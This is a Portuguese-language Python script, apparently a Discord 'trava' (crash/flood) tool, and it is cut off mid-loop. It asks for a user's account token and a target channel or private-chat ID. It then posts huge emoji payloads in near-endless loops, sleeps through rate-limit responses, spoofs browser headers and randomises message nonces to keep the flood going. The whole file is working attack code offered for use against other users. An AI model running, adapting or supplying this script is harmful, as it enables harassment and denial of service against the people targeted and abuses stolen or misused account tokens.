# -*- coding: utf-8 -*-
# code by: rydoo, felipe travas, hypn0thcy
try:
    import requests
    import json
    import time
    import random
    import os
except Exception:
    os.system("cls")
    print('\n\n          Instalando Dependências!!')
    os.system('pip install requests')
    input('\n\n               Sucesso! Pressione ENTER Para Fechar, E abra o script Novamente!')
    exit()


logo = """
         ______                             ____  _                          __
        /_  __/________ __   ______ _      / __ \(_)_____________  _________/ /
         / / / ___/ __ `/ | / / __ `/_____/ / / / / ___/ ___/ __ \/ ___/ __  / 
        / / / /  / /_/ /| |/ / /_/ /_____/ /_/ / (__  ) /__/ /_/ / /  / /_/ /  
       /_/ /_/   \__,_/ |___/\__,_/     /_____/_/____/\___/\____/_/   \__,_/   
             @Created BY: rydoo, flipx_x e mobly travas && Edited BY: Hypn0thcy
"""


os.system("cls")
os.system("color 0a")
print(logo)

print('               Escreva Abaixo Qual Opção Deseja Usar:')
print('\n                  [1] -> Travar Um Chat (GRUPO)')
print('                    [2] -> Travar Privado (PESSOA)\n')


try:
    groupORdm = str(input("Sua Escolha -> ")).strip().lower()

    if groupORdm == '1':
        os.system('cls')
        print(logo)
        token = str(input("Token -> ")).strip() # Aqui Estou solicitando que o usuario insira o TOKEN.

        headers = {'Authorization':token,'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.12 Chrome/78.0.3904.130 Electron/7.3.2 Safari/537.36'}

        payload1 = {'content':'****'}
        
        payload2 = {'content':'****'}
        
        payload3 = {'content':'****'}
        
        cID = str(input("ID Do Chat -> ")).strip() # Aqui Estou solicitando que o usuario insira o ID Do chat que ele deseja flodar.
        print('                  Opção De Emojis:\n')
        print('[1] -> emojí')
        print('[2] -> chacha')
        print('[3] -> letra')
        op = str(input("          Qual Usar? -> ")).strip()

        if op == '1':
            for hypn0thcyLindo in range(0, 9999999999):
                try:
                    r = requests.post(f'https://discord.com/api/v8/channels/{cID}/messages', headers=headers, json=payload1)
                    if r.status_code == 200:
                        print('Trava Enviada Com Sucesso!!')
                    elif r.status_code == 429:
                        data = json.loads(r.text)
                        print(f'Voltando a enviar daqui {data["retry_after"]} segundos!!')
                        time.sleep(data['retry_after'])
                    else:
                        print(f'Houve Um Erro CRITÍCO! | {r.status_code} | {r.text}')
                except Exception as errorWarn:
                    print('Houve Um Erro CRITÍCO! | {}'.format(errorWarn))

        elif op == '2':
            for hypn0thcyLindo in range(0, 9999999999):
                try:
                    r = requests.post(f'https://discord.com/api/v8/channels/{cID}/messages', headers=headers, json=payload2)
                    if r.status_code == 200:
                        print('Trava Enviada Com Sucesso!!')
                    elif r.status_code == 429:
                        data = json.loads(r.text)
                        print(f'Voltando a enviar daqui {data["retry_after"]} segundos!!')
                        time.sleep(data['retry_after'])
                    else:
                        print(f'Houve Um Erro CRITÍCO! | {r.status_code} | {r.text}')
                except Exception as errorWarn:
                    print('Houve Um Erro CRITÍCO! | {}'.format(errorWarn))
        
        elif op == '3':
            for hypn0thcyLindo in range(0, 9999999999):
                try:
                    r = requests.post(f'https://discord.com/api/v8/channels/{cID}/messages', headers=headers, json=payload3)
                    if r.status_code == 200:
                        print('Trava Enviada Com Sucesso!!')
                    elif r.status_code == 429:
                        data = json.loads(r.text)
                        print(f'Voltando a enviar daqui {data["retry_after"]} segundos!!')
                        time.sleep(data['retry_after'])
                    else:
                        print(f'Houve Um Erro CRITÍCO! | {r.status_code} | {r.text}')
                except Exception as errorWarn:
                    print('Houve Um Erro CRITÍCO! | {}'.format(errorWarn))
        
        else:
           os.system("color 4")
           print('\n\n       DIGITE APENAS 1, 2 OU 3!')
           input('\n      Pressione ENTER Para Fechar!!')
           exit() 
        



    elif groupORdm == '2':
        os.system('cls')
        print(logo)
        token = str(input("Token -> ")).strip() # Aqui Estou solicitando que o usuario insira o TOKEN.

        uID = str(input("ID Do Privado (COPIE OS NUMEROS DEPOIS DO @me/)-> ")).strip() # Aqui Estou solicitando que o usuario insira o ID Da Pessoa ele deseja travar.
        print('                  Opção De Emojis:\n')
        print('[1] -> 🐵🙈🙉🙊🐒')
        print('[2] -> 👹☠️👺👻💀')
        print('[3] -> 🌇🌌🎑🌁🌆🌉')
        op = str(input("          Qual Usar? -> ")).strip()

        nn = ['1','2','3','4','5','6','7','8','9','0']
        
        headers = {'Authorization':token,
        'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0',
        'Connection':'keep-alive',
        'Content-Type':'application/json',
        'Host':'discord.com',
        'Origin':'https://discord.com',
        'Referer':f'https://discord.com/channels/@me/{uID}'}
        
        if op == '1':
            for hypn0thcyLindo in range(0, 9999999999):
                try:
                    n = random.choice(nn)
                    n1 = random.choice(nn)
                    n2 = random.choice(nn)
                    n3 = random.choice(nn)
                    n4 = random.choice(nn)
                    n5 = random.choice(nn)
                    n6 = random.choice(nn)
                    payload = {'content':'**🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐵🐒🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🙈🙉🐵🙈🙉🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈**',
                    'nonce': f'7707895532{n1}{n6}{n5}{n4}{n3}3{n}{n2}',
                    'tts': 'false'}

                    r = requests.post(f'https://discord.com/api/v8/channels/{uID}/messages', headers=headers, json=payload)
                    if r.status_code == 200:
                        print('Trava Enviada Com Sucesso!!')
                    elif r.status_code == 429:
                        data = json.loads(r.text)
                        print(f'Voltando a enviar daqui 7 segundos!!')
                        time.sleep(7)
                    else:
                        print(f'Houve Um Erro CRITÍCO! | {r.status_code} | {r.text}')
                        input('\n     Pressione ENTER Para Fechar!!')
                        exit()
                except Exception as errorWarn:
                    print('Houve Um Erro CRITÍCO! | {}'.format(errorWarn))
                    input('\n     Pressione ENTER Para Fechar!!')
                    exit()
            time.sleep(0.5)
            os.system('color')
            time.sleep(0.5)

        elif op == '2':
            for hypn0thcyLindo in range(0, 9999999999):
                try:
                    n = random.choice(nn)
                    n1 = random.choice(nn)
                    n2 = random.choice(nn)
                    n3 = random.choice(nn)
                    n4 = random.choice(nn)
                    n5 = random.choice(nn)
                    n6 = random.choice(nn)
                    payload2 = {'content':'**👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹☠️👺👻💀👹**',
                    'nonce': f'7707895532{n1}{n6}{n5}{n4}{n3}3{n}{n2}',
                    'tts': 'false'}

                    r = requests.post(f'https://discord.com/api/v8/channels/{uID}/messages', headers=headers, json=payload2)
                    if r.status_code == 200:
                        print('Trava Enviada Com Sucesso!!')
                    elif r.status_code == 429:
                        data = json.loads(r.text)
                        print(f'Voltando a enviar daqui 7 segundos!!')
                        time.sleep(7)
                    else:
                        print(f'Houve Um Erro CRITÍCO! | {r.status_code} | {r.text}')
                        input('\n     Pressione ENTER Para Fechar!!')
                        exit()
                except Exception as errorWarn:
                    print('Houve Um Erro CRITÍCO! | {}'.format(errorWarn))
                    input('\n     Pressione ENTER Para Fechar!!')
                    exit()
            time.sleep(0.5)
            os.system('color')
            time.sleep(0.5)
        
        elif op == '3':
            for hypn0thcyLindo in range(0, 9999999999):
                try:
                    n = random.choice(nn)
                    n1 = random.choice(nn)
                    n2 = random.choice(nn)
                    n3 = random.choice(nn)
                    n4 = random.choice(nn)
                    n5 = random.choice(nn)
                    n6 = random.choice(nn)
